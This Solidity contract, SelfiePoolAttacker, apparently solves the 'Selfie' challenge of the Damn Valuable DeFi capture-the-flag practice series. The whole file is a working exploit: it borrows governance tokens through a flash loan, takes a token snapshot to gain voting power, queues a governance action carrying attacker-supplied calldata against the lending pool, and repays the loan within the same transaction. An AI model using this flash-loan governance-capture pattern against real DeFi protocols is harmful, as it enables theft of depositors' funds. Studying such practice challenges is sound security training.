// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

/**
 * @title SelfiePoolAttacker
 */

interface InterfaceSelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface interfaceSimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
}


contract SelfiePoolAttacker {

    bytes data;
    address immutable receiver;
    InterfaceSelfiePool immutable pool;
    interfaceSimpleGovernance immutable governance;

    uint256 public actionId;

    constructor(bytes memory _data, address _pool, address _governance){
        data =_data;
        receiver = _pool;
        pool = InterfaceSelfiePool(_pool);
        governance = interfaceSimpleGovernance(_governance);
    }

    function flashLoan(uint256 borrowAmount) external {
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(token).snapshot();
        actionId = governance.queueAction(receiver,data,0);
        DamnValuableTokenSnapshot(token).transfer(msg.sender,amount);
    }
}